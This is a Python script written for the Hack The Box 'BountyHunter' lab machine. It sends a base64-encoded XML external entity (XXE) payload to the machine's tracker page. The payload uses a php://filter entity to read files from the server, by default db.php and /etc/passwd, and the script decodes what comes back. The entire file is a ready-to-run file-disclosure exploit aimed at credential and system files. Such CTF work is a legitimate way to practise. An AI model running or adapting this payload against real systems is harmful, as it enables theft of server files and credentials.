import requests
import base64
from bs4 import BeautifulSoup
import argparse


"""
Used specifically for BountyHunter on hackthebox.
Created by Clutch
"""


def harvest(important_files: list = None):
    if important_files is None:
        important_files = ['db.php', '/etc/passwd']

    url = 'http://bountyhunter.htb/tracker_diRbPr00f314.php'
    for i in important_files:
        db_php_xml_payload = f"""<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource={i}">]>
        <bugreport>
        <title>&ac;</title>
        </bugreport>""".encode()

        base64_encoded_data = base64.b64encode(s=db_php_xml_payload)
        payload = {
            "data": base64_encoded_data
        }

        r = requests.post(url=url, data=payload)

        soup = BeautifulSoup(r.text, "lxml")
        data = soup.find_all('td')[1].text
        print(f"# {r.status_code=}")
        print(f"# {i}_data: {base64.b64decode(s=data).decode()}")
        print(f"")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Log havester.')
    parser.add_argument('--file',
                        type=str,
                        help='Path to the directory you\'d like to recursively search.')
    args = parser.parse_args()
    if type(args.file) == type('str'):
        harvest(important_files=[args.file])
    elif type(args.file) == type(['list']):
        harvest(important_files=args.file)
    else:
        harvest()
